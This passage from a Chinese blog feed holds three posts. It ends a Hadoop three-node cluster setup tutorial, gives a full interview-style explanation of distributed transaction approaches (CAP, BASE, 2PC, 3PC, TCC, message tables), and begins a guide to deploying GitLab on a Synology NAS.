&lt;p&gt;&lt;strong&gt;4：选择完整克隆&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203084041666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;配置另外两台虚拟机的ip和主机名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把已经克隆的两台机子的主机名和ip添加在etc下面的hosts&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;vim /etc/hosts
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;添加另外两台的主机名和ip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后三台虚拟机的hosts内容应当一致&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201201184712889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;配置相关的ssh免密钥登录（为什么要配置ssh免密钥登录）&quot;&gt;配置相关的ssh免密钥登录（为什么要配置ssh免密钥登录）&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;单节点启动太麻烦！！！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;生成公钥和私钥：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt; ssh-keygen -t rsa
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;然后敲（三个回车），就会生成两个文件 id_rsa（私钥）、id_rsa.pub（公钥）&lt;br/&gt;将公钥拷贝到要免密登录的目标机器上&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt; ssh-copy-id hadoop2
 ssh-copy-id hadoop3
 ssh-copy-id hadoop4
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;群起节点最后的准备&quot;&gt;群起节点最后的准备&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;配置 slaves&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cd /opt/soft/hadoop-2.7.t/etc/hadoop/slaves
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;编辑salves&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt; vim  slaves
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;在该文件中增加如下内容：(创建的三台虚拟机都要添加)&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;hadoop2
hadoop3
hadoop4
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203081027397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;启动集群&quot;&gt;启动集群&lt;/h3&gt;
&lt;p&gt;如果集群是第一次启动，需要格式化 NameNode（&lt;strong&gt;注意格式化之前，一定要先停&lt;br/&gt;止上次启动的所有 namenode 和 datanode 进程，然后再删除 data 和 log 数据&lt;/strong&gt;）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt; bin/hdfs namenode -format
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201202201719912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在你的主节点上启动dfs&lt;/strong&gt;（&lt;strong&gt;上面的查看进程没有启动yarn&lt;/strong&gt;）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;start-dfs.sh
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203082208650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在你配置yarn的机子上启动yarn&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;start-yarn.sh
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201203082316737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;打开你的浏览器输入ip端口（端口是50070）可以看到hadoop对应的界面&quot;&gt;打开你的浏览器输入ip+端口（端口是50070）可以看到hadoop对应的界面&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201202202526355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXpoaTU1NTU1NWppZQ==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:28:00 +0000</pubDate>
<dc:creator>xiaozhounandu</dc:creator>
<og:description>（这篇博客是本人csdn原创） 虚拟机的创建（可以自行百度） 虚拟机静态网络的设置 1：首先更改虚拟机的名字 hostnamectl set-hostname hadoop2 2：进入network配</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xiaozhounandu/p/14166282.html</dc:identifier>
</item>
<item>
<title>分布式事务了解吗？你们的多个服务间数据一致性解决方案是什么？ - 纪莫</title>
<link>http://www.cnblogs.com/jimoer/p/14164364.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jimoer/p/14164364.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;看标题就知道，这个又是个在面试中被问到的问题。这个问题其实是在我上次换工作的时候面试被问到过几次，之前也没在意过，觉得这个东西可能比较深奥，我直接说不理解吧。但是随着Java开发这个行业越来越卷，这次换工作一定要做好充足的准备。把之前落下的坑都填好，再出去受虐（面试）。&lt;/p&gt;
&lt;h2 id=&quot;什么是分布式事务&quot;&gt;什么是分布式事务&lt;/h2&gt;
&lt;p&gt;我们都知道本地事务是有四个特性的：&lt;strong&gt;原子性（atomicity）&lt;/strong&gt;、&lt;strong&gt;一致性（consistency）&lt;/strong&gt;、&lt;strong&gt;隔离性（isolation）&lt;/strong&gt;和&lt;strong&gt;持久性（durability）&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;本地事务的ACID一般都是靠关系型数据库来完成的，非关系型数据库一般也可以考数据库来实现，redis这种不能回滚的弱事务除外。&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;但是在分布式系统中一次操作由多个服务协同完成，这种一次事务操作涉及多个系统通过网络协同完成的过程称为分布式事务。&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201219201304578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_30,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;多个服务之间的可以是同一个数据库，也可以是多个数据库。&lt;/p&gt;
&lt;p&gt;另外如果是在同一个服务中，使用了多个数据源连接了不同的数据库，当一个事务需要操作多个数据源的时候也是属于分布式事务。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201219203832250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_30,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;cap&quot;&gt;CAP&lt;/h2&gt;
&lt;p&gt;CAP理论是目前分布式系统中的处理分布式事务的理论基础。主要是在目前分布式系统中都无法同时满足如下三个属性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;一致性（Consistency）&lt;/strong&gt;：&lt;mark&gt;多个服务的数据需要保持在同一时刻的数据一致性。&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可用性（Availability）&lt;/strong&gt;：&lt;mark&gt;指单个系统提供的服务需要一直保持可用状态，对于每一个请求，都能及时的响应，超时或不无响应则认为系统不可用。&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;分区容错性（Partition Tolerance）&lt;/strong&gt;：&lt;mark&gt;分布式系统再遇到任何网络分区故障时，仍能够保证对外提供满足一致性和可用性的服务，除非整个网络环境发生故障。&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;在分布式系统中。一个服务最多只能保证上面其中任何两个属性，并不能同时满足。&lt;/p&gt;
&lt;p&gt;在保证分区容错性的时候并不能保证数据的一致性和服务的可用性。如果要提高服务的可用性，就要增加多个结点，虽然节点越多可用性越好，但是数据一致性就会越差。&lt;/p&gt;
&lt;p&gt;这样在分布式系统设计中，同时满足“一致性”、“可用性”和“分区容错性”几乎是不可能的。&lt;/p&gt;
&lt;h3 id=&quot;cap应用组合&quot;&gt;CAP应用组合&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;【CA】放弃分区容错性&lt;/strong&gt;：放弃分区容错性，也要保证网络可用，最简单的做法就是将所有数据都放在同一个节点上，虽然这样无法保证100%系统不出错，但至少不会出现由于网络分区带来的负面影响。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;【CP】放弃可用性&lt;/strong&gt;：放弃可用性，是指一但遇到网络分区或其他系统问题时，那受到影响的服务需要等待一定时间，应用等待期间系统无法对外提供正常服务。即短时间内不可用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;【AP】放弃一致性&lt;/strong&gt;：所谓的放弃一致性，其实并不是完全的不需要一致性，而是放弃强一致性，保证了数据最终一致性。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;base理论&quot;&gt;BASE理论&lt;/h3&gt;
&lt;p&gt;在分布式系统中，往往追求的是可比性，一般重要程度比一致性高。所以就又出现了另一个理论，就是BASE理论，是对CAP理论的一个扩充。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Base Availability(基本可用)；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Soft state(软状态)；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Eventually consistent(最终一致性);&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;BASE理论是对CAP理论中的一致性和可用性的一种权衡的结果，主要思想就是：无法做到强一致，但每个应用可以根据自身业务的特点，采用适当的方式来使系统达到最终的一致性。&lt;/p&gt;
&lt;h2 id=&quot;分布式事务的解决方案&quot;&gt;分布式事务的解决方案&lt;/h2&gt;
&lt;p&gt;分布式事务的解决方案，目前市面上是有几类的方式的。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;2PC（两阶段提交）、3PC（三阶段提交）；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TCC方案；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;本地消息表；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可靠消息最终一致性方案；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最大努力通知方案；&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;2pc（两阶段提交）&quot;&gt;2PC（两阶段提交）&lt;/h3&gt;
&lt;p&gt;两阶段提交主要是将提交事务和执行事务分为了两步。&lt;/p&gt;
&lt;p&gt;第一阶段：事务协调器通知参与者准备提交事务，参与者准备成功之后向协调者返回成功，若有一个参与者返回的是准备不成功，那么事务执行失败。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201219232408366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_40,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;第二阶段：事务协调器根据各个参与者的第一阶段的返回结果，发起最终提交事务的请求，若有一个参与者提交失败，则所有参与者都执行回滚，事务执行失败。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201220135820769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_40,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;这种属于强一致性的实现，因为在多个服务间的事务执行过程中，有可能第一个服务的事务已经提交了，第二服务提交失败了，虽然说可以让第二个服务的事务回滚但是第一个服务有可能事务已经执行完成了，无法进行回滚了。所以多数情况下是将第二个服务其实是进行重试提交，然后直到重试成功为止，重试到一定次数后仍没有成功就需要预警出来人工干预了。&lt;/p&gt;
&lt;p&gt;两阶段提交是一种尽量保证强一致性的分布式事务，因此它是同步阻塞的，而同步阻塞就导致长时间锁定资源问题，所以总体而言效率低，并且存在单点故障的问题（有可能协调者挂，也有可能协调者和其中的某个服务挂了，协调者就不清楚挂了的那个服务到底是执行没执行事务了），所以在极端情况下还是存在数据不一致的风险。&lt;/p&gt;
&lt;p&gt;另外就是2PC其实更适合这种多数据源的情况，并且数据源都是关系型数据库。这样可以让两个数据库中的事务都同时处于prepare阶段，提交的时候两个数据库中的事务一起commit。&lt;/p&gt;
&lt;h3 id=&quot;3pc（三阶段提交）&quot;&gt;3PC（三阶段提交）&lt;/h3&gt;
&lt;p&gt;3PC其实就是比较2PC多了一个预提交阶段，3PC的第一阶段做的事情其实是询问参与者是否有条件执行事务，主要目的就是检查一下是否都可用。第二阶段才是和2PC的第一阶段一样呢。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201220145437938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_50,color_c8cae6,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3PC出现的目的是为了解决，2PC阶段协调组和参与者都挂了之后新选举的协调者不知道当前应该提交还是应该回滚的问题。&lt;/p&gt;
&lt;p&gt;如果新的协调者来的时候发现一个参与者处于预提交或提交阶段，代表以及过了，所有参与者的确认阶段，这样就直接提交事务就可以了。&lt;/p&gt;
&lt;p&gt;所以说新出现的预提交阶段目的是为了让协调者知道，每个参与者目前都是什么阶段，后面该如何同步各个参与者的状态。&lt;/p&gt;
&lt;p&gt;但是3PC还是不能保证，当协调者和某个参与者都挂了的时候，重新连接上的参与者是否已经执行了事务。&lt;/p&gt;
&lt;h3 id=&quot;tcc&quot;&gt;TCC&lt;/h3&gt;
&lt;p&gt;TCC和上面的两种方案对比更像是 ，分布式服务之间的事务解决方案。应用面更广一些。&lt;/p&gt;
&lt;p&gt;TCC的全称是指：&lt;strong&gt;Try、Confirm、Cancel&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Try&lt;/strong&gt;：对事务参与者的资源的锁定与预留。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Confirm&lt;/strong&gt;：这个阶段是在各个参与者服务中执行真正的事务操作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cancel&lt;/strong&gt;：如果任何一个服务的业务方法执行出错，那么这里就需要进行补偿，就是对已经执行的业务执行回滚操作。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201220152855179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,size_40,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这种方式比较繁琐，每一次事务都要定义三个操作，try-confirm-cancel。而且TCC对业务的侵入性比较大，每个业务都要写相应得到撤销方法。而且如果撤销方法有不成功的情况，还有保证幂等。&lt;/p&gt;
&lt;p&gt;但是还是有场景使用的，想一些涉及到支付、交易等这种强一致性，但又是多个服务的场景，使用TCC时比较合理的。这样能严格保证分布式事务要么都成功，要么都失败回滚。&lt;/p&gt;
&lt;h3 id=&quot;本地消息表&quot;&gt;本地消息表&lt;/h3&gt;
&lt;p&gt;本地消息表的思想主要是依靠各个服务之间的本地事务来保证的。&lt;/p&gt;
&lt;p&gt;就是在服务的本地建立一张消息表，一般是在数据库中。&lt;br/&gt;&lt;strong&gt;当执行分布式事务的时候执行完本地操作后，在本地的消息表中插入一条数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然后将消息发送到MQ中，下一个服务接收到消息后执行本地操作，操作成功后更新消息表中的状态。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果下一个服务执行失败了，那么消息表中的状态是不会变的，这样就靠定时任务去刷消息表来进行重试，但是这样需要保证被重试的服务是幂等的，这样就保证最终数据一致。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;可靠消息&quot;&gt;可靠消息&lt;/h3&gt;
&lt;p&gt;可靠消息实际上指的是靠消息中间件来实现分布式事务。&lt;/p&gt;
&lt;p&gt;比如A公司的RocketMQ就用消息中间件实现了分布式事务。&lt;/p&gt;
&lt;p&gt;例如A系统会先发一个prepared消息到MQ中，消息发送成功了，再执行本地事务，本地事务执行成功了告诉MQ事务执行成功了。否则发送回滚消息。&lt;/p&gt;
&lt;p&gt;B系统接收到prepared消息后开始执行本地事务，事务执行成功了，也是告诉MQ发送执行成功。&lt;/p&gt;
&lt;p&gt;MQ 会自动定时轮询所有 prepared 消息回调你的接口，问你，这个消息是不是本地事务处理失败了，所有没发送确认的消息，是继续重试还是回滚？一般来说这里你就可以查下数据库看之前本地事务是否执行，如果回滚了，那么这里也回滚吧。这个就是避免可能本地事务执行成功了，而确认消息却发送失败了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这个时候就需要自己实现反查接口。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果这个方案里，要是系统 B 的事务失败了咋办？重试咯，自动不断重试直到成功，如果实在是不行，要么就是针对重要的资金类业务进行回滚，比如 B 系统本地回滚后，想办法通知系统 A 也回滚；或者是发送报警由人工来手工回滚和补偿。&lt;/p&gt;
&lt;h3 id=&quot;最大努力通知&quot;&gt;最大努力通知&lt;/h3&gt;
&lt;p&gt;最大努力通知，其实也算是一种最终一致性的方案。&lt;/p&gt;
&lt;p&gt;主要是当A系统执行完本地事务后，发送消息给MQ，然后去让B系统执行事务操作，如果B系统执行完成了，就消费消息，若B系统执行失败了，则执行重试，重试多次直到成功。若达到一定次数后还没成功就只能人工干预了。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;可靠消息那部分是因为我没有用过RocketMQ，所以并没有认真写，因为我目前在的是腾讯系的公司所以。。。&lt;/p&gt;
&lt;p&gt;总结一下面试的时候如果被问到这个问题怎么办，其实就是根据实际的业务场景来看，像涉及到交易，订单等这种强一致性的场景，可以使用TCC，虽然说对也侵入性大，但是最终目的是很好的保证了。&lt;br/&gt;还有就是对于时效性要求不是很强的，我觉得的最大努力通知也可以的。&lt;/p&gt;
&lt;p&gt;最后说一下我们的目前使用的方案；&lt;br/&gt;也算是最大努力通知的一种吧，当在一个web服务中，调用多个服务时，如何保证多个服务执行时数据一致性的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当事务请求调用服务A时，如果服务A的操作执行失败了，那么直接事务执行失败。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果执行服务A的事务成功了，但是执行服务B的事务失败了，那么我们会先将失败的请求落地（请求参数和被调用方信息入到消息表），然后将请求抛到消息队列中去进行重试，通过消息队列的ACK机制，保证我们重试消息最终可以被消费成功。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要重试次数是3次，每次的重试的时间间隔不一样，重试三次之后如果消息还没有被ACK，那么就直接发送预警通知给开发人员，进行人工干预。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果发送消费失败了，我们还有定时任务去定时刷我们的数据库里的消息表，来保证消息一定会被发送。&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20201220174118418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SmlNb2Vy,,size_50,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;另外在真实涉及到支付，订单交易的场景时，我们主要也是使用类似TCC的方式来保证的。&lt;/p&gt;
&lt;p&gt;说是类似是因为，我们只有CC。要么成功，要么不成功，就直接调用回撤接口进行回滚。&lt;/p&gt;
</description>
<pubDate>Mon, 21 Dec 2020 00:21:00 +0000</pubDate>
<dc:creator>纪莫</dc:creator>
<og:description>前言 看标题就知道，这个又是个在面试中被问到的问题。这个问题其实是在我上次换工作的时候面试被问到过几次，之前也没在意过，觉得这个东西可能比较深奥，我直接说不理解吧。但是随着Java开发这个行业越来越卷</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jimoer/p/14164364.html</dc:identifier>
</item>
<item>
<title>群晖DS218+部署GitLab - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/14166249.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/14166249.html</guid>
<description>&lt;h3 id=&quot;欢迎访问我的github&quot;&gt;欢迎访问我的GitHub&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot; target=&quot;_blank&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS等；&lt;/p&gt;
&lt;h3 id=&quot;起因是懒&quot;&gt;起因是懒&lt;/h3&gt;
&lt;p&gt;最近开始折腾GitLab的CI功能，就打算在家部署一个GitLab，通常做法是打开电脑，启动GitLab，用完再关闭电脑，总觉得这些操作挺麻烦（您想骂我懒么？您骂得对.....）&lt;/p&gt;
&lt;h3 id=&quot;群晖解决烦恼&quot;&gt;群晖解决烦恼&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;家里有台群晖DS218+，从不关机，为全家提供稳定的图片和视频服务，之前已在上面部署了maven私服、MySQL，运行得很稳定，今天就把GitLab也部署在上面吧，今后可以随时想用就用，算得上懒人救星了。&lt;/li&gt;
&lt;li&gt;下图是DS218+刚买来的样子，两块NAS硬盘，一直在稳定服务：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075648254-421450052.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 下图是网购的内存条，现在一共2+8=10G内存，内存充足才是敢折腾的底气：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075649003-1570639250.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;前文链接&quot;&gt;前文链接&lt;/h3&gt;
&lt;p&gt;之前折腾群晖的记录：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105460567&quot; target=&quot;_blank&quot;&gt;群晖DS218+部署mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105462692&quot; target=&quot;_blank&quot;&gt;群晖DS218+部署kafka&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105458466&quot; target=&quot;_blank&quot;&gt;群晖DS218+做maven私服(nexus3)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/boling_cavalry/article/details/105465233&quot; target=&quot;_blank&quot;&gt;K8S使用群晖DS218+的NFS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xinchen.blog.csdn.net/article/details/106962214&quot; target=&quot;_blank&quot;&gt;群晖DS218+部署Harbor(1.10.3)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;思路&quot;&gt;思路&lt;/h3&gt;
&lt;p&gt;其实操作很简单：GitLab的部署是基于docker-compose的，群晖已带有docker-compose了，按照官方的部署指南操作即可，以下几处是要注意的地方：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;部署操作需要管理员权限，所以不在网页上操作了，而是SSH登录后台进行操作；&lt;/li&gt;
&lt;li&gt;GitLab最好是用域名访问，如果用IP就意味着文件访问地址中带有IP，一旦IP变了，原有的文件访问地址就无效了&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;环境信息&quot;&gt;环境信息&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;群晖系统：DSM 6.2.2-24922 Update 4&lt;/li&gt;
&lt;li&gt;GitLab：Community Edition 13.0.6&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;配置host&quot;&gt;配置host&lt;/h3&gt;
&lt;p&gt;GitLab中的文件都有访问地址，用GitLab服务器的IP作为这个地址显然是不合适的（如果GitLab服务器的IP变了这个文件的访问地址就无效了），所以以下两点需要满足：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;为GitLab服务器准备域名，这里就是给群晖的IP地址准备域名：&lt;span&gt;gitlab.synology.com&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;确保群晖自己能通过域名访问到GitLab&lt;/li&gt;
&lt;li&gt;确保所有访问者都能通过域名访问到GitLab&lt;/li&gt;
&lt;li&gt;一般是修改访问者的hosts文件来达到域名访问的目标，我这里为了省事儿，是在路由器里配置的：&lt;span&gt;192.168.50.43 gitlab.synology.com&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;允许ssh登录&quot;&gt;允许SSH登录&lt;/h3&gt;
&lt;p&gt;先要设置允许SSH后台登录：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如下图红框的操作：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075649560-999907065.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;2. 如下图，勾选启用SSH功能，端口就用22：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075649923-155807049.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;3. 现在用SSH终端即可登录群晖了，我这里是在windows电脑上用Xshell6登录的，您可以选用任意SSH终端工具，账号密码就是能登录群晖的账号密码，如下图，登录后，就可以使用日常的linux命令了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202012/485422-20201221075650289-797865372.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;4. 注意上图的红框，登录账号的home目录是&lt;span&gt;/var/services/homes/zq2599&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;部署&quot;&gt;部署&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;创建&lt;span&gt;docker-compose.yml&lt;/span&gt;文件，内容如下(大多数内容可以直接使用，需要修改的地方稍后会说)：&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
